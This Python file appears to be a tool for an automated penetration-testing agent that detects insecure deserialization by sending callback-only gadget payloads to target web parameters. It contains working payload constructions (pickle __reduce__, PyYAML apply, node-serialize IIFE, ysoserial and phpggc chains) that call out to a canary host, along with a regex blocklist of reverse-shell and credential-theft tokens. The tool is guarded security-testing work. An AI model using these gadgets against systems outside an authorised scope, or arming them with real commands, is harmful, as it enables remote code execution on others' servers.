#!/usr/bin/env python3
"""
run.py -- deserialization-rce entry point.

Identifies insecure-deserialization sinks (Java, PHP, Python, Node) and verifies
them with BENIGN, OOB-only gadget chains. A confirmed out-of-band callback proves
the sink deserializes attacker input and is RCE-capable.

SAFETY MODEL (the highest-impact skill -- guardrails are load-bearing)
----------------------------------------------------------------------
* OOB detection, never weaponized RCE. The ONLY thing a payload does on
  deserialization is a benign callback to a unique canary host: a DNS resolution
  (preferred: ysoserial URLDNS, pickle socket.gethostbyname) or an HTTP GET. No
  shell, no reverse shell, no file/registry/network action beyond that ping.
  Actual weaponization (real command execution) is a human-gated escalation this
  skill does NOT perform.
* Destructive-command blocklist. Every embedded command/URL must be one of this
  skill's own benign OOB templates aimed at the canary host; a guard
  (_assert_benign) refuses anything else (rm, /dev/tcp, nc, reverse shells,
  pipes-to-shell, chmod, etc.).
* Scope-gated. Generated payloads (binary) + responses offloaded to the spill
  store, referenced by id.

CONTRACT
--------
* Input  : {"target_url": "...", "parameters": ["data"], "tech_stack": ["python"],
            "oob_domain": "...", "delivery": "json|form|cookie|raw",
            "config": {"oob_poll_url": "...", "encoding": "base64"},
            "scope_policy_spill_id": "..."}
* Output : one strict JSON artifact on stdout (references/ARTIFACT_SCHEMA.md).
"""
from __future__ import annotations

import asyncio
import base64
import json
import os
import pickle
import re
import secrets
import shutil
import sys
import time
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlsplit

try:
    import httpx  # type: ignore
except ImportError:  # pragma: no cover
    httpx = None

try:
    from spill_store import read_spill, write_spill
except ImportError:  # pragma: no cover
    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
    from spill_store import read_spill, write_spill  # type: ignore

HTTP_TIMEOUT = float(os.environ.get("DESER_HTTP_TIMEOUT", "20"))
OOB_WAIT = int(os.environ.get("DESER_OOB_WAIT", "15"))
YSOSERIAL_JAR = os.environ.get("YSOSERIAL_JAR", "ysoserial.jar")

# Anything matching this in an embedded command/URL aborts payload generation.
DESTRUCTIVE = re.compile(
    r"\brm\b|\brmdir\b|mkfifo|/dev/tcp|/dev/udp|\bnc\b|\bncat\b|bash\s+-i|sh\s+-i|"
    r"reverse|chmod|chown|\bdd\b|shutdown|reboot|useradd|passwd|>\s*/|\|\s*(sh|bash)|"
    r"powershell|cmd\.exe|certutil|/etc/shadow|id_rsa|\beval\b|base64\s+-d\s*\|", re.I)
# Benign OOB command/URL templates this skill is allowed to emit.
_ALLOWED_CMD = re.compile(r"^(nslookup|host|dig|getent hosts|curl -s)\s+\S+$")


def _now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


def _host_of(url: str) -> str:
    try:
        return (urlsplit(url).hostname or "").lower()
    except ValueError:
        return ""


class UnsafeInvocation(Exception):
    pass


def _assert_benign(text: str, canary_host: str) -> None:
    """Refuse anything destructive, and require the callback to target the
    canary host (no arbitrary destinations)."""
    if DESTRUCTIVE.search(text):
        raise UnsafeInvocation(f"destructive token in payload command: {text[:60]}")
    if canary_host and canary_host not in text:
        raise UnsafeInvocation("payload callback does not target the canary host")


class ScopePolicy:
    def __init__(self, policy: Optional[dict], target_host: str):
        self.raw = policy or {}
        self.have_policy = policy is not None
        self.in_scope = [self._c(p) for p in self.raw.get("in_scope", [])]
        self.out_scope = [self._c(p) for p in self.raw.get("out_of_scope", [])]
        if not self.in_scope and target_host:
            self.in_scope = [self._c(target_host), self._c(f"*.{target_host}")]

    @staticmethod
    def _c(pattern: str) -> re.Pattern:
        p = pattern.strip().lower().rstrip(".")
        if p.startswith("*."):
            return re.compile(rf"^([a-z0-9_-]+\.)*{re.escape(p[2:])}$")
        return re.compile(rf"^{re.escape(p)}$")

    def allowed(self, host: str) -> bool:
        h = (host or "").strip().lower()
        if not h:
            return False
        if any(rx.match(h) for rx in self.out_scope):
            return False
        return any(rx.match(h) for rx in self.in_scope)


class _PickleCallback:
    """__reduce__ payload that performs ONLY a benign OOB HTTP GET on load."""
    url = ""

    def __reduce__(self):
        import urllib.request
        return (urllib.request.urlopen, (self.url,))


class _PickleDNS:
    """__reduce__ payload that performs ONLY a benign DNS resolution on load."""
    host = ""

    def __reduce__(self):
        import socket
        return (socket.gethostbyname, (self.host,))


class DeserializationTester:
    def __init__(self, target_url: str, parameters: List[str], tech_stack: Optional[List[str]] = None,
                 oob_domain: Optional[str] = None, delivery: str = "json",
                 scope_policy_spill_id: Optional[str] = None, config: Optional[dict] = None):
        self.target_url = target_url.strip()
        self.target_host = _host_of(self.target_url)
        self.parameters = [p for p in (parameters or []) if p]
        self.tech = [t.lower() for t in (tech_stack or [])]
        self.oob_domain = (oob_domain or "").strip() or None
        self.delivery = (delivery or "json").lower()
        self.config = config or {}
        self.encoding = self.config.get("encoding", "base64")
        self.errors: List[Dict[str, str]] = []
        self.canaries: Dict[str, dict] = {}   # canary -> {language, gadget, param}
        policy = None
        if scope_policy_spill_id:
            try:
                policy = read_spill(scope_policy_spill_id)
            except Exception as exc:  # noqa: BLE001
                self.errors.append({"stage": "scope_load", "error": str(exc)})
        self.scope = ScopePolicy(policy, self.target_host)

    # -- OOB targets -----------------------------------------------------------
    def _canary_host(self, canary: str) -> str:
        if self.oob_domain:
            return f"{canary}.{self.oob_domain}"
        poll = self.config.get("oob_poll_url", "")
        return urlsplit(poll).netloc or "oob.local"

    def _canary_url(self, canary: str) -> str:
        host = self._canary_host(canary)
        # if using a poll host (test collaborator), the canary is a path segment
        if not self.oob_domain and self.config.get("oob_poll_url"):
            return f"http://{host}/{canary}"
        return f"http://{host}/"

    def _new_canary(self, language: str, gadget: str, param: str) -> str:
        c = "d" + secrets.token_hex(6)
        self.canaries[c] = {"language": language, "gadget": gadget, "parameter": param}
        return c

    # -- payload generators (return list of (gadget, bytes, descriptor)) -------
    def generate_python_payloads(self, param: str) -> List[Tuple[str, bytes, str, str]]:
        out = []
        # pickle over HTTP GET (works with test collaborator + interactsh HTTP)
        c1 = self._new_canary("python", "pickle:urlopen", param)
        url = self._canary_url(c1)
        _assert_benign(url, self._canary_host(c1))
        p = _PickleCallback()
        p.url = url
        out.append(("pickle:urlopen", pickle.dumps(p), url, c1))
        # pickle DNS variant (interactsh DNS channel)
        c2 = self._new_canary("python", "pickle:dns", param)
        host = self._canary_host(c2)
        _assert_benign(host, host)
        pd = _PickleDNS()
        pd.host = host
        out.append(("pickle:gethostbyname", pickle.dumps(pd), host, c2))
        # PyYAML unsafe_load
        c3 = self._new_canary("python", "yaml:urlopen", param)
        url3 = self._canary_url(c3)
        _assert_benign(url3, self._canary_host(c3))
        y = f"!!python/object/apply:urllib.request.urlopen ['{url3}']"
        out.append(("yaml:urlopen", y.encode(), url3, c3))
        return out

    def generate_node_payloads(self, param: str) -> List[Tuple[str, bytes, str, str]]:
        c = self._new_canary("node", "node-serialize:IIFE", param)
        url = self._canary_url(c)
        _assert_benign(url, self._canary_host(c))
        # node-serialize RCE runs the function immediately (IIFE). Benign: GET only.
        payload = ('{"rce":"_$$ND_FUNC$$_function(){require(\'http\').get(' +
                   json.dumps(url) + ')}()"}')
        return [("node-serialize:IIFE", payload.encode(), url, c)]

    async def generate_java_payloads(self, param: str) -> List[Tuple[str, bytes, str, str]]:
        if shutil.which("java") is None or not os.path.exists(YSOSERIAL_JAR):
            self.errors.append({"stage": "java", "error": "java/ysoserial.jar unavailable"})
            return []
        out = []
        c = self._new_canary("java", "URLDNS", param)
        host = self._canary_host(c)
        url = f"http://{host}/"
        _assert_benign(url, host)
        # URLDNS: pure DNS lookup on deserialize, NO command execution.
        argv = ["java", "-jar", YSOSERIAL_JAR, "URLDNS", url]
        try:
            proc = await asyncio.create_subprocess_exec(
                *argv, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
            data, err = await asyncio.wait_for(proc.communicate(), 60)
            if data:
                out.append(("URLDNS", data, url, c))
            else:
                self.errors.append({"stage": "java", "error": err.decode("utf-8", "replace")[:200]})
        except Exception as exc:  # noqa: BLE001
            self.errors.append({"stage": "java", "error": str(exc)})
        return out

    async def generate_php_payloads(self, param: str) -> List[Tuple[str, bytes, str, str]]:
        if shutil.which("phpggc") is None:
            self.errors.append({"stage": "php", "error": "phpggc unavailable"})
            return []
        out = []
        c = self._new_canary("php", "phpggc", param)
        host = self._canary_host(c)
        cmd = f"nslookup {host}"          # benign DNS lookup
        try:
            _assert_benign(cmd, host)
            if not _ALLOWED_CMD.match(cmd):
                raise UnsafeInvocation("command not in allowed OOB templates")
        except UnsafeInvocation as exc:
            self.errors.append({"stage": "php_guard", "error": str(exc)})
            return []
        chain = self.config.get("phpggc_chain", "Guzzle/FW1")
        argv = ["phpggc", chain, "system", cmd]
        try:
            proc = await asyncio.create_subprocess_exec(
                *argv, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
            data, err = await asyncio.wait_for(proc.communicate(), 60)
            if data:
                out.append((f"phpggc:{chain}", data, cmd, c))
            else:
                self.errors.append({"stage": "php", "error": err.decode("utf-8", "replace")[:200]})
        except Exception as exc:  # noqa: BLE001
            self.errors.append({"stage": "php", "error": str(exc)})
        return out

    # -- delivery --------------------------------------------------------------
    def _encode(self, data: bytes) -> str:
        return base64.b64encode(data).decode() if self.encoding == "base64" else \
            data.decode("latin-1", "replace")

    async def _deliver(self, client, param: str, data: bytes) -> None:
        value = self._encode(data)
        try:
            if self.delivery == "cookie":
                await client.get(self.target_url, cookies={param: value})
            elif self.delivery == "form":
                await client.post(self.target_url, data={param: value})
            elif self.delivery == "raw":
                await client.post(self.target_url, content=data,
                                  headers={"Content-Type": "application/octet-stream"})
            else:  # json
                await client.post(self.target_url, json={param: value})
        except Exception as exc:  # noqa: BLE001
            self.errors.append({"stage": "deliver", "error": f"{param}: {exc}"})

    async def verify_oob(self) -> List[str]:
        poll = self.config.get("oob_poll_url")
        if not poll or httpx is None:
            return []
        deadline = time.time() + OOB_WAIT
        collected: List[str] = []
        while time.time() < deadline:
            try:
                async with httpx.AsyncClient(timeout=HTTP_TIMEOUT) as c:
                    r = await c.get(poll)
                data = r.json()
                items = data.get("interactions", data) if isinstance(data, dict) else data
                collected = [it if isinstance(it, str) else json.dumps(it) for it in (items or [])]
                if any(cn in " ".join(collected) for cn in self.canaries):
                    break
            except Exception:  # noqa: BLE001
                break
            await asyncio.sleep(3)
        return collected

    # -- orchestration ---------------------------------------------------------
    def _languages(self) -> List[str]:
        langs = set()
        for t in self.tech:
            if t in ("java", "spring", "jsf", "jackson", "jvm"):
                langs.add("java")
            elif t in ("php", "laravel", "symfony", "wordpress"):
                langs.add("php")
            elif t in ("python", "flask", "django", "pickle"):
                langs.add("python")
            elif t in ("node", "nodejs", "express", "node-serialize"):
                langs.add("node")
        return sorted(langs) or ["python"]   # default to the safest, tool-free path

    async def run(self) -> dict:
        started = time.time()
        if httpx is None:
            self.errors.append({"stage": "http", "error": "httpx not installed"})
            return self._artifact([], started, fatal=True)
        if not self.scope.allowed(self.target_host):
            self.errors.append({"stage": "scope", "error": f"{self.target_host} not in scope"})
            return self._artifact([], started, fatal=True)
        if not self.parameters:
            self.errors.append({"stage": "input", "error": "no parameters supplied"})
            return self._artifact([], started, fatal=True)

        langs = self._languages()
        # (canary, gadget, payload bytes, descriptor, param)
        generated: List[Tuple[str, str, bytes, str, str]] = []
        for param in self.parameters:
            batch: List[Tuple[str, bytes, str, str]] = []
            if "python" in langs:
                batch += self.generate_python_payloads(param)
            if "node" in langs:
                batch += self.generate_node_payloads(param)
            if "java" in langs:
                batch += await self.generate_java_payloads(param)
            if "php" in langs:
                batch += await self.generate_php_payloads(param)
            for gadget, data, desc, canary in batch:
                generated.append((canary, gadget, data, desc, param))

        payloads_meta = []
        try:
            async with httpx.AsyncClient(timeout=HTTP_TIMEOUT, follow_redirects=True) as client:
                for canary, gadget, data, desc, param in generated:
                    spill = write_spill({"gadget": gadget, "language": self.canaries.get(canary, {}).get("language"),
                                         "parameter": param, "payload_b64": base64.b64encode(data).decode(),
                                         "oob_target": desc, "canary": canary, "captured_at": _now_iso()})
                    payloads_meta.append({"canary": canary, "gadget": gadget, "param": param,
                                          "language": self.canaries.get(canary, {}).get("language"),
                                          "spill": spill})
                    await self._deliver(client, param, data)
            hits = await self.verify_oob()
        except Exception as exc:  # noqa: BLE001
            self.errors.append({"stage": "run", "error": repr(exc)})
            hits = []

        findings = []
        joined = " ".join(hits)
        for pm in payloads_meta:
            confirmed = bool(pm["canary"]) and pm["canary"] in joined
            if confirmed:
                findings.append({
                    "language": pm["language"] or "python", "gadget_chain": pm["gadget"],
                    "parameter": pm["param"], "payload_spill_id": pm["spill"],
                    "oob_confirmed": True,
                    "confidence": "confirmed",  # normalized so DualMethodVerifier reads it
                })
        return self._artifact(findings, started, payloads_meta=payloads_meta, oob_hits=len(hits))

    def _artifact(self, findings, started, payloads_meta=None, oob_hits=0, fatal=False) -> dict:
        return {
            "findings": findings,
            "meta": {
                "skill": "deserialization-rce", "version": "1.0", "phase": "5",
                "status": "error" if fatal else "ok",
                "generated_at": _now_iso(),
                "duration_seconds": round(time.time() - started, 2),
                "target_host": self.target_host,
                "languages": self._languages() if not fatal else [],
                "payloads_generated": len(payloads_meta or []),
                "oob_interactions": oob_hits,
                "safety": {"oob_only": True, "command_execution_weaponized": False,
                           "destructive_blocklist": True,
                           "callback_forms": ["dns", "http_get"]},
            },
            "scope_summary": {"policy_present": self.scope.have_policy,
                              "target_host": self.target_host},
            "errors": self.errors,
        }


# --- entry point -------------------------------------------------------------
def _load_input(argv: List[str]) -> dict:
    raw = ""
    if len(argv) > 1 and argv[1].strip():
        raw = argv[1]
    elif not sys.stdin.isatty():
        raw = sys.stdin.read()
    raw = raw.strip()
    if not raw:
        raise ValueError("no input: expected JSON {\"target_url\":\"...\",\"parameters\":[...]}")
    obj = json.loads(raw)
    if not isinstance(obj, dict):
        raise ValueError("input must be a JSON object")
    return obj


def _error_artifact(message: str) -> dict:
    return {
        "findings": [],
        "meta": {"skill": "deserialization-rce", "version": "1.0", "phase": "5",
                 "status": "error", "generated_at": _now_iso()},
        "errors": [{"stage": "init", "error": message}],
    }


async def _amain(argv: List[str]) -> int:
    try:
        payload = _load_input(argv)
    except Exception as exc:  # noqa: BLE001
        print(json.dumps(_error_artifact(f"input error: {exc}")))
        return 2
    target = str(payload.get("target_url", "")).strip()
    if not target or urlsplit(target).scheme not in ("http", "https"):
        print(json.dumps(_error_artifact("invalid 'target_url' (need http(s) URL)")))
        return 2
    tester = DeserializationTester(
        target_url=target, parameters=payload.get("parameters") or [],
        tech_stack=payload.get("tech_stack"), oob_domain=payload.get("oob_domain"),
        delivery=payload.get("delivery", "json"),
        scope_policy_spill_id=payload.get("scope_policy_spill_id"), config=payload.get("config"))
    artifact = await tester.run()
    print(json.dumps(artifact, ensure_ascii=False))
    return 0


def main() -> int:
    return asyncio.run(_amain(sys.argv))


if __name__ == "__main__":
    raise SystemExit(main())
